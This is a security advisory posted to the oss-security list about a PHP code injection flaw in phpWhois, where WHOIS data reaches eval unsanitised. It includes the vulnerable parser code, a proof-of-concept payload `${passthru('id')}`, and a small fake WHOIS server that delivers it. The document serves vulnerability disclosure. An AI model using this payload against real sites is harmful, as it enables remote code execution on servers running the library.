  oss-security - rediscovered: phpWhois before  PHP Code Injection            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Wed, 1 Aug From: SBA Research Advisory <advisory@...-research.org> To: <oss-security@...ts.openwall.com> Subject: rediscovered: phpWhois before  PHP Code Injection  # phpWhois PHP Code Injection #  Link:  ## Vulnerability Overview ##  phpWhois and some of its forks in versions before are prone to a code injection vulnerability due to insufficient sanitization of returned WHOIS data. This allows attackers controlling the WHOIS information of a requested domain to execute arbitrary PHP code in the context of the application.  * **Identifier**            : * **Type of Vulnerability** : Code Injection * **Software/Product Name** : phpWhois * **Vendor**                : [phpwhois.org](http://www.phpwhois.org/),                               [abcdmitry](https://github.com/phpWhois/phpWhois),                                                             [webalternative](https://github.com/webalternative/phpWhois)                               and others * **Affected Versions**     : phpwhois.org: and probably prior,                               as well as the following forks                               abcdmitry: and probably prior,                               jsmitty12: and probably prior * **Fixed in Version**      : jsmitty12: * **CVE ID**                : * **CVSSv3 Vector**         : CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H * **CVSSv3 Base Score**     : 9.8 (Critical)  ## Vendor Description ##  > This package contains a Whois library for PHP. It allows a > PHP program to create a Whois object, and obtain the output of a > whois query with the lookup function.  Source: <https://github.com/phpWhois/phpWhois>  ## Impact ##  By exploiting the vulnerability documented in this advisory, an attacker controlling the WHOIS information of a domain retrieved via phpWhois can execute arbitrary PHP code in the context of the application. The set of domains enabling this attack vector is limited to certain top-level domains. Sensitive data accessible by the application might get exposed through this attack.  The vulnerability is fixed in version or newer of jsmitty12's fork. We recommend upgrading to this version.  ## Vulnerability Description ##  phpWhois implements multiple generic parsers for WHOIS data in `whois.parser.php`. The parser implemented in function `generic_parser_b` is vulnerable to injection of PHP code.  The function `generic_parser_b` builds a PHP statement from WHOIS data values by concatenating strings without proper sanitization. It then passes the statement to the `eval` function:  ```php function generic_parser_b($rawdata, $items = array(), $dateformat = 'mdy', $hasreg = true, $scanall = false) { [...]     foreach ($rawdata as $val) {         if (trim($val) != '') {             if (($val[0] == '%' || $val[0] == '#') && $disok) {                 $r['disclaimer'][] = trim(substr($val, 1));                 $disok = true;                 continue;             }             $disok = false;             reset($items);             foreach ($items as $match => $field) {                 $pos = strpos($val, $match);                 if ($pos !== false) {                     if ($field != '') {                         $var = '$r' . getvarname($field);                         $itm = trim(substr($val, $pos + strlen($match)));                         if ($itm != '')                             eval($var . '="' . str_replace('"', '\"', $itm) . '";');                     }                     if (!$scanall)                         break;                 }             }         } [...] } ```  At least the following 33 top-level domain handlers make use of the vulnerable parser:  ```text ae, aero, ag, asia, au, bh, biz, cat, cn, co, co.za, fi, hu, in, info, jp, lu, me, mobi, museum, name, nz, org, pro, ru, sc, se, su, tel, travel, us, ws, xxx ```  ## Proof-of-Concept ##  An attacker can exploit this vulnerability by setting malicious WHOIS information such as `Registrant Name: ${passthru('id')}` for an arbitrary `.org` domain. Instead of a real name, we specify `${passthru('id')}` which PHP will interpret as a variable expansion inside double quoted string literals. We simulate this situation via a simple WHOIS server implementation:  ```py import SocketServer  DATA = "Registrant Name: ${passthru('id')}\n"  class WhoisHandler(SocketServer.BaseRequestHandler):     def handle(self):                 print('Request received')         self.request.sendall(DATA)         print('Payload sent')  if __name__ == '__main__':     SocketServer.ThreadingTCPServer.allow_reuse_address = True     server = WhoisHandler)     server.serve_forever() ```  The following example sets up phpWhois to use the simulated WHOIS server and requests information for `example.org`:  ```php <?php require_once(__DIR__ . '/vendor/autoload.php');  $whois = new phpWhois\Whois; $whois->useServer('org', echo $whois->lookup('example.org'); ```  Therefore, the vulnerable phpWhois version executes the injected PHP statement `passthru('id')` which will execute the Unix `id` command on the server and return its output.  ## Timeline ##  * identification of vulnerability * initial contact of several phpWhois and fork maintainers * disclosed vulnerability to phpwhois.org project maintainer * disclosed vulnerability to jsmitty12 * phpwhois.org project maintainer stated that it is a                 known issue with a fix committed at                 <https://github.com/sparc/phpWhois.org> * fix is not released yet and MITRE lists                 as assigned but private * jsmitty12 released fixed version * public disclosure  ## References ##  * Original advisory: * Fixes:   *   *   *  ## Credits ##  * Original advisory by Iain Wallace ([Nettitude](https://www.nettitude.com/)) * Rediscovered by David Gnedt ([SBA Research](https://www.sba-research.org/))  Download attachment of type "application/pgp-keys" bytes)  Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      